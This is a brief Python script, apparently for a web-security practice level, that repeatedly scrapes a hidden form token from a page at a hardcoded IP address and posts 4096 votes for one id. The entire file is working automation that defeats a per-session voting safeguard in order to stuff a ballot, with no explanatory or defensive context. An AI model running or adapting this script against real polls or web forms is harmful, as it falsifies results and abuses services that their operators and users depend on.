import requests
from bs4 import BeautifulSoup


poison_data = {"id": "3403", "holdthedoor":"submit", "key":""}

for i in range(0, 4096):
    
    hodorsession = requests.session()
    html_website = hodorsession.get("http://158.69.76.135/level1.php")
    souped_page = BeautifulSoup(html_website.text, "html.parser")
    hidden_key = souped_page.find("form", {"method": "post"})
    hidden_key = hidden_key.find("input", {"name": "key"})
    poison_data["key"] = hidden_key["value"]
    hodorsession.post("http://158.69.76.135/level1.php", data=poison_data)
    print(i+1)
    


